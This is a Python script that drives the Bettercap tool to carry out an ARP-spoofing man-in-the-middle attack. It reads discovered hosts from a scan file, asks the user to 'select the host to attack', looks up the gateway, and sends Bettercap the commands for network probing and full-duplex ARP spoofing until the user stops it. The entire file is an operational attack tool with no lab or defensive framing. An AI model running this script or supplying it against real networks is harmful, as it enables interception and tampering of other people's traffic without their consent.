import json
import os
import subprocess
import netifaces
from pathlib import Path
import sys
import select
 
def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None

def load_hosts(json_file: str):
    with open(json_file, "r") as f:
        data = json.load(f)

    hosts = []
    # older/other format: "hosts"
    if data.get("hosts"):
        for host in data.get("hosts", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))
    # this repo uses "scan_parsed"
    elif data.get("scan_parsed"):
        for host in data.get("scan_parsed", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))

    return hosts, data
 
def delete_scan_files(prefix: Path):
    prefix = prefix.with_suffix("") 
    suffixes = [".json"]

    for suf in suffixes:
        f = Path(str(prefix) + suf)
        if f.exists():
            try:
                os.remove(f)
            except Exception:
                pass

def show_menu():
    print("=" * 50)
    print("\n MITM Attack ")
    print("=" * 50)
    print("1. ARP Spoofing")

    print("2. Exit")
 

def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
    cmd = ["bettercap", "-iface", iface]
    print(f"Starting Bettercap on interface {iface}...")
    print("Waiting for Bettercap to start and discover hosts...")
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    print("\n" + "=" * 50)
    print("Bettercap is starting... Please wait.")
    print("=" * 50 + "\n")
    
    import time
    time.sleep(3)  
    
    print("[*] Starting network probe to discover hosts...")
    proc.stdin.write("net.probe on\n")
    proc.stdin.flush()
    
    input("\n[?] Press Enter when you see the target host in Bettercap...")
    
    print(f"\n[*] Configuring ARP spoof for target: {target_ip}")
    if gateway_ip:
        print(f"[*] Gateway: {gateway_ip}")
    
    proc.stdin.write(f"set arp.spoof.targets {target_ip}\n")
    proc.stdin.flush()
    time.sleep(0.5)
    
    if gateway_ip:
        proc.stdin.write(f"set arp.spoof.gateway {gateway_ip}\n")
        proc.stdin.flush()
        time.sleep(0.5)
    
    proc.stdin.write("set arp.spoof.fullduplex true\n")
    proc.stdin.flush()
    time.sleep(0.5)
    
    print("[*] Starting ARP spoofing...")
    proc.stdin.write("arp.spoof on\n")
    proc.stdin.flush()
    
    print("\n" + "=" * 50)
    print("ARP Spoofing is now ACTIVE!")
    print("Press Enter to stop the attack...")
    print("=" * 50 + "\n")
    
    try:
        while True:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
            if rlist:
                _ = sys.stdin.readline()
                print("\n[*] Stopping ARP spoofing...")
                proc.stdin.write("arp.spoof off\n")
                proc.stdin.flush()
                time.sleep(1)
                proc.stdin.write("exit\n")
                proc.stdin.flush()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    proc.wait(timeout=3)
                break
    except KeyboardInterrupt:
        print("\n[*] Interrupted! Stopping ARP spoofing...")
        proc.stdin.write("arp.spoof off\n")
        proc.stdin.flush()
        time.sleep(1)
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.terminate()
            proc.wait(timeout=3)



def main():

    hosts, data = load_hosts("scan_result.json")

    default_iface = data.get("iface", "wlan0")

    print("Hosts discovered:")
    for i, (ip, mac) in enumerate(hosts, 1):
        print(f"{i}. IP: {ip}, MAC: {mac}")

    while True:
        try:
            choice_raw = input("Select the host to attack (number): ")
            choice = int(choice_raw)
            if 1 <= choice <= len(hosts):
                break
            print(f"Choose a number between 1 and {len(hosts)}.")
        except ValueError:
            print("Enter a valid number.")

    target_ip = hosts[choice-1][0]
    gateway_ip = get_gateway_ip()

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "1":
            run_bettercap(iface=default_iface, target_ip=target_ip, gateway_ip=gateway_ip)
        elif opt == "2":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please choose 1 or 2.")

if __name__ == "__main__":
    main()